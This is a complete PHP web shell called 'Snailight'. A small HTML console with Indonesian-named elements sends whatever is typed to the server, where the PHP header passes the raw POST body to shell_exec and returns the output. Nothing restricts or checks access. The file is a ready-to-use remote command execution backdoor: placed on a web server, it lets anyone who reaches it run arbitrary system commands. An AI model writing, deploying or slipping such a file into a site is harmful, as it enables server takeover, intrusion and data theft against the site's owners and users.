<?php
// Execute command via shell and return the complete output as a string
if($_SERVER['REQUEST_METHOD'] == 'POST') {
  $shell = file_get_contents("php://input");
  die(htmlspecialchars(shell_exec($shell)));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snailight</title>
  <link rel="stylesheet" href="assets/vendor/bootstrap-5.3.3-dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/vendor/bootstrap-icons/bootstrap-icons.min.css">
  <link rel="stylesheet" href="assets/css/exec.css">
</head>
<body>
  <div class="luaran">
    <div class="hasil">
      <div id="papan">
        <p>Console ready!</p>
      </div>
    </div>
    <div class="ketik">
      <div class="form-group">
        <div class="input-group">
          <span class="input-group-text" style="background: #e9ecef;">$</span>
          <input type="text" id="ketikan" class="form-control" placeholder="Enter Shell" required>
          <span class="btn btn-primary input-group-text" id="picu">Run</span>
        </div>
      </div>
    </div>
  </div>
  <script src="assets/js/exec.js"></script>
</body>
</html>